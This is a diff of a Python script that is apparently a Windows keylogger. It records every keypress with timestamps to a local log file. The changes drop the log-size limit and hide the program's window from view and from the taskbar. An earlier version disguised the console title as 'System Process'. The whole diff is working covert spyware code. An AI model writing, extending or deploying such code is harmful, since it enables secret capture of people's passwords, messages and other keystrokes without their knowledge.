@@ -8,11 +8,11 @@
 #Made by Arkem using ChatGPT
 
 
-import keyboard
 import os
+import sys
 import datetime
 import win32gui
-import sys
+import keyboard
 import ctypes
 import win32con
 
@@ -62,13 +62,7 @@ KEY_MAP = {
     "f12": "[F12]",
 }
 
-NUM_LINES_TO_KEEP = 1000
-
 log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "log.txt")
-
-if not os.path.exists(log_file):
-    os.makedirs(os.path.dirname(log_file), exist_ok=True)
-    open(log_file, "a").close()
 
 def write_keys(keys_pressed, last_time, file):
     with open(file, "a") as f:
@@ -84,20 +78,7 @@ def write_keys(keys_pressed, last_time, file):
                 f.write(f"{time_str} {''.join(keys_pressed)}")
             else:
                 f.write(''.join(keys_pressed))
-
-        num_lines = sum(1 for _ in open(file))
-        if num_lines > NUM_LINES_TO_KEEP:
-            clean_file(file)
-
         return current_time
-
-
-def clean_file(file):
-    with open(file, "r") as f:
-        lines = f.readlines()
-    with open(file, "w") as f:
-        f.writelines(lines[-NUM_LINES_TO_KEEP:])
-
 
 def on_press(event):
     try:
@@ -111,22 +92,26 @@ def on_press(event):
     except Exception as e:
         print(f"Error: {e}")
 
-
 def set_process_name():
     if hasattr(sys, 'frozen'):
         kernel32 = ctypes.WinDLL('kernel32')
-        kernel32.SetConsoleTitleW("System Process")
+        kernel32.SetConsoleTitleW("Keywatch")
+
+def set_window_properties():
+    hwnd = win32gui.GetForegroundWindow()
+    win32gui.SetWindowText(hwnd, "Keywatch")
+    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)
+    win32gui.SetWindowLong(hwnd, win32con.GWL_EXSTYLE, win32gui.GetWindowLong(hwnd, win32con.GWL_EXSTYLE) | win32con.WS_EX_TOOLWINDOW)
 
 if __name__ == "__main__":
     set_process_name()
+    set_window_properties()
 
     with open(log_file, "a") as f:
-        f.write(
-            f"\nLancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n"
-        )
+        f.write(f"\nLancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")
 
     last_time = datetime.datetime.now()
 
-    keyboard.on_press(on_press)
-    keyboard.wait()
-
+    while True:
+        keyboard.on_press(on_press)
+        keyboard.wait()
